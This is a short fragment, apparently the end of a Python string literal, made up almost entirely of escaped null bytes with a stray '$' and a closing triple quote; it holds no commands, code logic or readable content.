00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$
'''
